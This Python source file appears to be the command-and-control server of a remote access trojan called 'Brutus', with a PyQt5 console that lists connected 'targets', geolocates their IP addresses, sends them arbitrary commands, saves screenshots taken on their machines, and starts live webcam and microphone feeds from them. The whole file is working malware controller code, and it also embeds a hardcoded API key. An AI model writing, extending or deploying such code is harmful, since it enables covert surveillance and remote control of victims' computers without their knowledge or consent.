import asyncio
import socket
import time
import sys
import os
from PyQt5 import QtWidgets, QtCore, QtGui
from PyQt5.QtGui import QIcon
from PyQt5.uic import loadUi
from pynput.keyboard import Key, Listener, Controller
import threading
import asyncore
import multiprocessing
import struct
import pickle
import cv2
from multiprocessing import Process
import threading
import requests
import json


window = None
video_thread = None
HOST = "192.168.2.100"
PORT = 8080


connections = {}
gui = []


keyboard = Controller()
current_folder = os.path.dirname(os.path.realpath(__file__))

VERSION = "BRUTUS V. 1.0 Beta"
ip = ""
API_KEY = "at_NRyhPs30wbLFz6eye9U6ezykeWjPg&ipAddress"


class MyMainWindow(QtWidgets.QMainWindow):
    
    def __init__(self):
        global ip
        super(MyMainWindow, self).__init__()
        loadUi("cmd-frontend.ui", self)
        self.setWindowTitle("Brutus")
        self.setFixedSize(690, 540)
        self.setWindowIcon(QIcon('brutus-icon.png'))
        try:
            r = requests.get('https://api.ipify.org?format=json', timeout=15)
            content = r.content
            content = content.decode("Cp1252")
            content = json.loads(content)
            ip_address = content["ip"]
            ip = ip_address
            self.Output.clear()
            self.Output.addItem(f"{VERSION} \t\t\t\t\t          {ip}")
        except Exception as e:
            print("Could not retrieve address!")

        


    def get_command(self):
        global video_thread, ip
        def on_press(key):
            global video_thread
            if str(key) == "Key.enter":
                command = self.Input.text()
                if self.Input.text() == "ip" or self.Input.text() == "get_ip":
                    try:
                        r = requests.get('https://api.ipify.org?format=json', timeout=15)
                        content = r.content
                        content = content.decode("Cp1252")
                        content = json.loads(content)
                        ip_address = content["ip"]
                        print(ip_address)
                    except Exception as e:
                        print(e)
                        print("Could not retrieve address!")
                elif self.Input.text() == "clear":
                    self.Output.clear()
                    self.Input.clear()
                    self.Output.addItem(f"{VERSION} \t\t\t\t\t          {ip}")
                elif self.Input.text() == "quit" or self.Input.text() == "exit":
                    self.hide()
                elif command.split(" ")[0] == "echo":
                    output_text = " ".join(command.split(" ")[1:])
                    self.Output.addItem(output_text)
                    self.Input.clear()
                elif self.Input.text() == "show_clients" or self.Input.text() == "show clients" or self.Input.text() == "sc":
                    active_connections = "\n".join(f"{key}\t\t{connections[key].addr}\t\t{ConnectionHandler.get_location(connections[key].addr[0])}" for key in connections.keys())
                    self.Output.addItem(f"\nID\t\t       Address\t\t\t   Location\n\n{active_connections}")
                    self.Input.clear()
                elif "@" in self.Input.text():  
                    try:
                        print(connections)
                        receiver = command.split("@")[0]
                        receiver = connections[int(receiver)]
                        print(f"RECEIVER: {receiver}")
                        receiver.send(command.split("@")[1].encode("utf-8"))
                        self.Input.clear()
                    except Exception as error:
                        print(error)
                        self.Output.addItem("[ ! ] ERROR Client not found.")
        with Listener(on_press=on_press) as listener:
            listener.join()


class ConnectionHandler(asyncore.dispatcher_with_send):

    receiving_image = False
    receiving_livefeed = False

    def __init__(self, sock, window, iD):
        asyncore.dispatcher_with_send.__init__(self, sock)
        self.window = window
        self.id = iD
        self.screenshot_number = 1

    def get_location(ip):
        global API_KEY
        location = ""
        try:
            r = requests.get(f"https://geo.ipify.org/api/v1?apiKey={API_KEY}ipAddress={ip}", timeout=5)
            content = r.content
            data = json.loads(content)
            location = f"{data['location']['country']} | {data['location']['region']} | {data['location']['city']}"
            print(location)
            return location
        except:
            return location
    
    def video_stream():
        os.system("python camera_feed.py")

    def audio_stream():
        os.system("python mic_host.py")
        
    def handle_read(self):
        global video_thread
        
        if ConnectionHandler.receiving_image:
            data = self.recv(809600)
            image_name = f"Screenshot_ID{self.id}_NUM{self.screenshot_number}.png"
            with open(image_name, "wb") as file:
                file.write(data)
            self.screenshot_number += 1
            saved_image_path = os.path.join(current_folder, image_name)
            self.window.Output.addItem(f"\n{time.strftime('%H:%M:%S')} Screenshot saved to: {saved_image_path}")
            ConnectionHandler.receiving_image = False
            
        
        else:
            data = self.recv(4096).decode("Cp1252")
            print(data)
            if data == "Taken Screenshot":
                ConnectionHandler.receiving_image = True
            elif data == "STARTING LIVESTREAM":
                video_thread = threading.Thread(target=ConnectionHandler.video_stream)
                video_thread.start()
            elif data == "STARTING AUDIOSTREAM":
                audio_thread = threading.Thread(target=ConnectionHandler.audio_stream)
                audio_thread.start()
            elif data != "":
                self.window.Output.addItem(f"\n{time.strftime('%H:%M:%S')} {data}")

    def handle_close(self):
        self.close()
        connections.pop(self.id)
        self.window.Output.addItem(f"{time.strftime('%H:%M:%S')}  Target {repr(self.addr)} disconnected from the server.")

    def handle_expt(self):
        self.close()
        connections.pop(self.id)
        self.window.Output.addItem(f"{time.strftime('%H:%M:%S')}  Target {repr(self.addr)} lost connection to the server.")

 
class Server(asyncore.dispatcher):

    client_number = 0

    def __init__(self, host, port, window):
        asyncore.dispatcher.__init__(self)
        self.create_socket()
        self.set_reuse_addr()
        self.bind((host, port))
        self.window = window
        self.listen(5)

    def handle_accepted(self, sock, addr):
        self.window.Output.addItem(f"{time.strftime('%H:%M:%S')}  Target {repr(addr)} connected to the server.")
        Server.client_number += 1
        connection = ConnectionHandler(sock, self.window, Server.client_number)
        connections[Server.client_number] = connection

  
def show_window():
    print("Showing window...")
    application = QtWidgets.QApplication(sys.argv)
    window = MyMainWindow()
    threading.Thread(target=window.get_command).start()
    gui.append(window)
    window.show()
    sys.exit(application.exec_())


def main():
    threading.Thread(target=show_window).start()
    time.sleep(2)
    server = Server(HOST, PORT, gui[0])
    print("Server running!")
    asyncore.loop()

if __name__ == "__main__":
    main()
    





